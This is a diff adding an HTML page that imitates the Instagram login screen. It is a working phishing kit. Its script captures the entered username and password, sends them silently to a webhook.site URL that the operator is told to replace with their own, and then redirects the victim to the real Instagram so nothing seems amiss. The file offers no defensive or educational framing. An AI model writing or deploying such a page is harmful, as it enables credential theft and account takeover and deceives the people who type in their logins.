@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px 20px; width: 350px; text-align: center; border-radius: 8px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #0077c5; }
+        .logo { font-size: 40px; font-weight: bold; margin-bottom: 20px; color: #000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <p style="color:#8e8e8e; margin-bottom:20px;">Log in to do testing</p>
+        
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+        
+        <p style="margin-top:20px; font-size:13px; color:#8e8e8e;">
+            This is a security verification for your private account.<br>
+            <small style="color:#0095f6;">Forgot password?</small>
+        </p>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();   // stops normal submit
+
+            // CHANGE THIS LINE ? put your webhook.site URL here
+            const webhookURL = "https://webhook.site/https://webhook.site/5191a7c7-2a98-4173-8147-1fbbc5b15f2f";
+
+            const formData = {
+                username: document.querySelector('input[name="username"]').value,
+                password: document.querySelector('input[name="password"]').value,
+                timestamp: new Date().toLocaleString()
+            };
+
+            // Send silently to you
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(formData)
+            }).then(() => {
+                // Redirect to real Instagram (he sees nothing suspicious)
+                window.location.href = "https://www.instagram.com";
+            }).catch(() => {
+                window.location.href = "https://www.instagram.com";
+            });
+        });
+    </script>
+</body>
+</html>
